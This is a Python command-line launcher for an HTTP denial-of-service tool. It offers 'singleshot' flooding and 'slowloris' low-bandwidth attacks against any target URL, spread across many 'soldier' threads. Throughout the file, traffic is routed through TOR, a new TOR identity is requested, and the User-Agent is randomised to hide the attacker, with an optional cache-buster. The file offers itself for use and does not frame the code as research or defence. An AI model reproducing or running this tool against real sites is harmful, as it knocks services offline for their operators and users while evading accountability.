#!/usr/bin/env python

import app.console
import app.net
import app.tor
from app.command import Platoon
from app.weapons.singleshot import SingleShotFactory
from app.weapons.slowloris import SlowLorisFactory
import fire
import signal
import sys


class CLI:

    def __init__(
            self,
            tor_address='127.0.0.1',
            tor_proxy_port=9050,
            tor_ctrl_port=9051,
            num_soldiers=10,
            http_method='GET',
            cache_buster=False
        ):
        """

        :param num_soldiers: Maximum of solider threads to spin up for the attack
        """

        self._tor_address = tor_address
        self._tor_proxy_port = tor_proxy_port
        self._tor_ctrl_port = tor_ctrl_port

        self._platoon = None  # app.command.Platoon
        self._num_soldiers = num_soldiers

        self._http_method = str(http_method).upper()
        self._cache_buster = cache_buster

        self._register_sig_handler()

    def singleshot(self, target):
        """
        Run an attack on a single URL.
        :param target: The target URL of the attack
        """

        try:

            self._init()

            app.console.system("running singleshot")

            weapon_factory = SingleShotFactory(
                http_method=self._http_method,
                cache_buster=self._cache_buster
            )

            self._platoon.attack(
                weapon_factory=weapon_factory,
                target_url=target
            )

        except Exception as ex:

            app.console.error(str(ex))

        self._shutdown()

    def slowloris(self, target, num_sockets=100):
        """
        Run a slow loris, low bandwidth attack on the given URL / domain.
        :param target: The target URL of the attack
        :param num_sockets: The number of sockets to open for each soldier thread
        """

        try:

            self._init()

            app.console.system("running slowloris")

            weapon_factory = SlowLorisFactory(
                http_method=self._http_method,
                cache_buster=self._cache_buster,
                num_sockets=num_sockets
            )

            self._platoon.attack(
                weapon_factory=weapon_factory,
                target_url=target
            )

        except Exception as ex:

            app.console.error(str(ex))

        self._shutdown()

    def _init(self):

        app.console.system("connecting to TOR; %s (proxy %d) (ctrl %d)" % (
            self._tor_address,
            self._tor_proxy_port,
            self._tor_ctrl_port
        ))

        app.tor.connect(
            address=self._tor_address,
            proxy_port=self._tor_proxy_port,
            ctrl_port=self._tor_ctrl_port
        )

        app.console.system("request new identity on TOR")
        app.tor.new_ident()

        ourip = app.net.lookupip()
        app.console.system("TOR IP; %s" % ourip)

        app.net.new_user_agent()
        app.console.system("User-Agent; %s" % app.net.get_user_agent())

        self._platoon = Platoon(
            num_soldiers=self._num_soldiers
        )

    def _shutdown(self):

        app.console.system("shutting down")

        app.console.system("closing connection to TOR")
        app.tor.close()

        app.console.shutdown()

    def _register_sig_handler(self):

        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, sig, frame):

        app.console.system("signal received, holding fire")
        self._platoon.hold_fire()


if __name__ == '__main__':
    fire.Fire(CLI)
